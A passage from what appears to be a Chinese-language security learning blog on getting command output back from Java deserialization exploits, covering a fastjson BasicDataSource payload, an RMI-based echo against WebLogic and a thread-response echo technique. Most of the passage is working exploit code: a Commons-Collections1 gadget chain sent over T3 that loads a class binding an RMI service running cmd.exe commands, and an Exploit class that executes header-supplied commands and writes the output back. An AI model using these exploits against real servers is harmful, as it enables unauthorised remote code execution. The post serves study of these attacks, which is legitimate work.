8$86$y1$caa$Vs$98$t$s$8b$b8$8d$ebX$a0$bc$ebd$df$a0$T$85$b2$5c$pi$ae$S$eb$9b$U5$8b$c8$Hr$c59$be$e4$b8$c5q$9b$e3$O$c7Wd$C$Z$dc$r$84B$Z$t$a8$a2$c5$9e$b0$fb$5daGS$d3$efp$fe$N$d4$a7$f3Md$dev$b5T$J$dd$e11E$96T5F$3a$ab$90$l$91s$f4$cd$Y$e9$v$9f$a0$dcK$f8$9a$yY$JG$e4$R$c7$b2$fc$bb$95$b0Y$ab$l$B$e8$60$97$T$ac$G$A$A&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;: &quot;bbb&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218145459924.png" alt="image-20201218145459924"></p>
<p>​        首先我们看一下BasicDataSource这个类是tomcat下的一个类，在tomat-dbcp.jar中，在进行json解析的过程中会调用getConnection()</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218150110385.png" alt="image-20201218150110385"></p>
<p>​        在createDataSource中调用createConnectionFactory</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218150145651.png" alt="image-20201218150145651"></p>
<p>​        在createConnectionFactory中调用Class.forName，并将class_name和classloader传入，后面的过程就和之前的demo一样，不再分析了。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218150304057.png" alt="image-20201218150304057"></p>
<p>​        这种方法目前只能在低版本的fastjson中利用，高版本的fastjson中加入了autoType属性，无法调用BasicDataSource。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218151232364.png" alt="image-20201218151232364"></p>
<h3 id="RMI回显"><a href="#RMI回显" class="headerlink" title="RMI回显"></a>RMI回显</h3><p>​        首先我们看下如何注册和使用RMI服务，下面是RMI Demo代码</p>
<p>RMIServer.java</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.rmi.Naming;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line">public class RMIServer &#123;</span><br><span class="line"></span><br><span class="line">    public interface IRemoteHelloWorld extends Remote &#123;  &#x2F;&#x2F; RMI调用对象接口定义，这个接口必须继承Remote接口，标明这是一个远程调用的接口，接口中定义的方法，会被Client端调用，也就是远程调用方法</span><br><span class="line">        public String hello() throws RemoteException;  &#x2F;&#x2F;远程调用方法必须要抛RemoteException异常</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld &#123;  &#x2F;&#x2F;远程对象实现类</span><br><span class="line">        &#x2F;&#x2F;UnicastRemoteObject用于导出的远程对象和获得与该远程对象通信的存根。</span><br><span class="line"></span><br><span class="line">        protected RemoteHelloWorld() throws RemoteException &#123; &#x2F;&#x2F;实现类需要重写无参构造器，且需要抛出RemoteException异常</span><br><span class="line">            super();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public String hello() &#123;</span><br><span class="line">            return &quot;helloworld&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void start() throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        RemoteHelloWorld h &#x3D; new RemoteHelloWorld();  &#x2F;&#x2F;创建远程对象</span><br><span class="line">        LocateRegistry.createRegistry(1099);  &#x2F;&#x2F;创建一个接受对1099端口调用的远程对象注册表</span><br><span class="line">        Naming.rebind(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Hello&quot;, h); &#x2F;&#x2F;把远程对象注册到RMI注册服务器上，并命名为Hello</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        new RMIServer().start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>RMIClient.java</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import com.test.rmi.RMIServer;</span><br><span class="line"></span><br><span class="line">import java.rmi.Naming;</span><br><span class="line"></span><br><span class="line">public class RMIClient &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        RMIServer.IRemoteHelloWorld hello &#x3D; (RMIServer.IRemoteHelloWorld)</span><br><span class="line">            Naming.lookup(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Hello&quot;);</span><br><span class="line">        String res &#x3D; hello.hello();</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        首先打开服务端，再打开客户端，最终执行了服务端的hello方法，并将执行结果返回给客户端。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218170046027.png" alt="image-20201218170046027"></p>
<p>​        因为使用RMI回显利用本质上还是会调用defineClass方法来加载远程类，但是ClassLoader是一个抽象类，不能通过反射来获取抽象类的对象，因此我们如果要利用defineClass方法加载类的字节码，可以尝试寻找ClassLoader的子类,我在weblogic下进行寻找，有不少的类都继承了ClassLoader。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221094830804.png" alt="image-20201221094830804"></p>
<p>​        在这些类中，有几个类在实现过程中会直接调用父类的defineClass方法，比如weblogic.jar!\jxxload_help\PathVFSJavaLoader.class</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221101826314.png" alt="image-20201221101826314"></p>
<p>​        还有weblogic.jar!\org\mozilla\classfile\DefiningClassLoader.class</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221101949975.png" alt="image-20201221101949975"></p>
<p>​        找到了加载类字节码的方式后，我们再看下哪些部分开启了RMI服务，我们之前了解过开启RMI服务需要继承Remote类，因此我们可以寻找继承Remote类的类。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221102653829.png" alt="image-20201221102653829"></p>
<p>​        由于我们希望通过RMI来进行回显，所以我们要找到的RMI Server端开启的服务需要返回String类型的数据,比如ClusterMasterRemote类的getServerLocation方法。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221114120045.png" alt="image-20201221114120045"></p>
<p>​        根据这个思路我们可以实现ClusterMasterRemote类并且重写getServerLocation方法，在这个方法中执行命令，并将命令执行的结果返回。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> weblogic.cluster.singleton.ClusterMasterRemote;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMITest</span> <span class="keyword">implements</span> <span class="title">ClusterMasterRemote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        RMITest remote = <span class="keyword">new</span> RMITest();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Context context = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            context.rebind(<span class="string">"test666"</span>,remote);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setServerLocation</span><span class="params">(String s, String s1)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getServerLocation</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> RemoteException </span>&#123;     <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">        List&lt;String&gt; cmds = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">        cmds.add(<span class="string">"cmd.exe"</span>);</span><br><span class="line">        cmds.add(<span class="string">"/c"</span>);</span><br><span class="line">        cmds.add(cmd);</span><br><span class="line"></span><br><span class="line">        ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder(cmds);</span><br><span class="line">        processBuilder.redirectErrorStream(<span class="keyword">true</span>);</span><br><span class="line">        Process proc = processBuilder.start();</span><br><span class="line"></span><br><span class="line">        BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(proc.getInputStream()));</span><br><span class="line">        StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            sb.append(line).append(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">return</span> e.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221134435820.png" alt="image-20201221134435820"></p>
<p>​        另外我们还需要通过利用链比如common-collection1来通过DefiningClassLoader的defineClass来加载RMITest类并执行类中的main方法绑定一个RMI服务,通过访问这个RMI服务，并传入需要执行的命令，就可以获取命令执行后的结果。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(DefiningClassLoader<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getDeclaredConstructor", new Class[]&#123;Class[].class&#125;, new Object[]&#123;new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("newInstance", new Class[]&#123;Object[].class&#125;, new Object[]&#123;new Object[0]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"defineClass"</span>,</span><br><span class="line">                        new Class[]&#123;String.class, byte[].class&#125;, new Object[]&#123;className, clsData&#125;),</span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"main", new Class[]&#123;String[].class&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;null&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="keyword">new</span> HashSet())&#125;;</span><br></pre></td></tr></table></figure>

<p>​        完整代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> com.supeream.serial.Reflections;</span><br><span class="line"><span class="keyword">import</span> com.supeream.serial.SerialDataGenerator;</span><br><span class="line"><span class="keyword">import</span> com.supeream.serial.Serializables;</span><br><span class="line"><span class="keyword">import</span> com.supeream.ssl.WeblogicTrustManager;</span><br><span class="line"><span class="keyword">import</span> com.supeream.weblogic.T3ProtocolOperation;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.mozilla.classfile.DefiningClassLoader;</span><br><span class="line"><span class="keyword">import</span> weblogic.cluster.singleton.ClusterMasterRemote;</span><br><span class="line"><span class="keyword">import</span> weblogic.corba.utils.MarshalledObject;</span><br><span class="line"><span class="keyword">import</span> weblogic.jndi.Environment;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String host = <span class="string">"192.168.3.30"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String port = <span class="string">"7001"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String classname = <span class="string">"RMITest"</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String url = <span class="string">"t3://"</span> + host + <span class="string">":"</span> + port;</span><br><span class="line">            <span class="keyword">byte</span>[] bs=getBs();</span><br><span class="line">            <span class="comment">// 安装RMI实例</span></span><br><span class="line">            invokeRMI(classname, bs);</span><br><span class="line"></span><br><span class="line">            Environment environment = <span class="keyword">new</span> Environment();</span><br><span class="line">            environment.setProviderUrl(url);</span><br><span class="line">            environment.setEnableServerAffinity(<span class="keyword">false</span>);</span><br><span class="line">            environment.setSSLClientTrustManager(<span class="keyword">new</span> WeblogicTrustManager());</span><br><span class="line">            Context context = environment.getInitialContext();</span><br><span class="line">            ClusterMasterRemote remote = (ClusterMasterRemote) context.lookup(<span class="string">"test666"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用RMI实例执行命令</span></span><br><span class="line">            String res = remote.getServerLocation(<span class="string">"ipconfig"</span>);</span><br><span class="line">            System.out.println(res);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">invokeRMI</span><span class="params">(String className, <span class="keyword">byte</span>[] clsData)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// common-collection1 构造transformers 定义自己的RMI接口</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(DefiningClassLoader<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getDeclaredConstructor", new Class[]&#123;Class[].class&#125;, new Object[]&#123;new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("newInstance", new Class[]&#123;Object[].class&#125;, new Object[]&#123;new Object[0]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"defineClass"</span>,</span><br><span class="line">                        new Class[]&#123;String.class, byte[].class&#125;, new Object[]&#123;className, clsData&#125;),</span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"main", new Class[]&#123;String[].class&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;null&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="keyword">new</span> HashSet())&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        InvocationHandler handler = (InvocationHandler) Reflections</span><br><span class="line">                .getFirstCtor(</span><br><span class="line">                        <span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>)</span><br><span class="line">                .newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">lazyMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map mapProxy = Map<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class">                .<span class="title">cast</span>(<span class="title">Proxy</span>.<span class="title">newProxyInstance</span>(<span class="title">SerialDataGenerator</span>.<span class="title">class</span>.<span class="title">getClassLoader</span>(),</span></span><br><span class="line">                        new Class[]&#123;Map.class&#125;, handler));</span><br><span class="line"></span><br><span class="line">        handler = (InvocationHandler) Reflections.getFirstCtor(</span><br><span class="line">                <span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>)</span><br><span class="line">                .newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">mapProxy</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化数据 MarshalledObject绕过</span></span><br><span class="line">        Object obj = <span class="keyword">new</span> MarshalledObject(handler);</span><br><span class="line">        ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        objOut.flush();</span><br><span class="line">        objOut.close();</span><br><span class="line">        <span class="keyword">byte</span>[] payload = out.toByteArray();</span><br><span class="line">        <span class="comment">// t3发送</span></span><br><span class="line">        T3ProtocolOperation.send(host, port, payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] getBs() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        File file=<span class="keyword">new</span> File(<span class="string">"C:\\Users\\admin\\Desktop\\RMITest.class"</span>);</span><br><span class="line">        Long filelength = file.length(); <span class="comment">// 获取文件长度</span></span><br><span class="line">        BufferedInputStream bis = <span class="keyword">null</span>;</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        FileInputStream in =<span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">        bis = <span class="keyword">new</span> BufferedInputStream(in);</span><br><span class="line">        <span class="keyword">byte</span>[] buf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((len = in.read(buf)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(buf, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">byte</span>[] buffer = baos.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> buffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221135505051.png" alt="image-20201221135505051"></p>
<h3 id="WebLogic回显"><a href="#WebLogic回显" class="headerlink" title="WebLogic回显"></a>WebLogic回显</h3><p>​        根据lufei在<code>weblogic_2019_2725poc与回显构造</code>中的分析，可以通过获取当前请求线程中的header和response对象，在header中获取请求参数，在response中通过<code>response.getOutputStream().write(&quot;xxxx&quot;);</code> 来获取命令执行的结果,代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String lfcmd = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getHeader(<span class="string">"lfcmd"</span>);</span><br><span class="line">weblogic.servlet.internal.ServletResponseImpl response = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getResponse();</span><br><span class="line">weblogic.servlet.internal.ServletOutputStreamImpl outputStream = response.getServletOutputStream();</span><br><span class="line">outputStream.writeStream(<span class="keyword">new</span> weblogic.xml.util.StringInputStream(lfcmd));</span><br><span class="line">outputStream.flush();</span><br><span class="line">response.getWriter().write(<span class="string">""</span>);</span><br></pre></td></tr></table></figure>

<p>​        这种获取回显的方法也可以配合到LDAP和RMI等协议获取回显的方式中，首先我们编写一个Exploit.java内容如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String lfcmd = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getHeader(<span class="string">"lfcmd"</span>);</span><br><span class="line">        String[] cmds = <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, lfcmd&#125;;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        java.util.Scanner s = <span class="keyword">new</span> java.util.Scanner(in).useDelimiter(<span class="string">"\\a"</span>);</span><br><span class="line">        String output = s.hasNext() ? s.next() : <span class="string">""</span>;</span><br><span class="line">        weblogic.servlet.internal.ServletResponseImpl response = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getResponse();</span><br><span class="line">        weblogic.servlet.internal.ServletOutputStreamImpl outputStream = response.getServletOutputStream();</span><br><span class="line"> 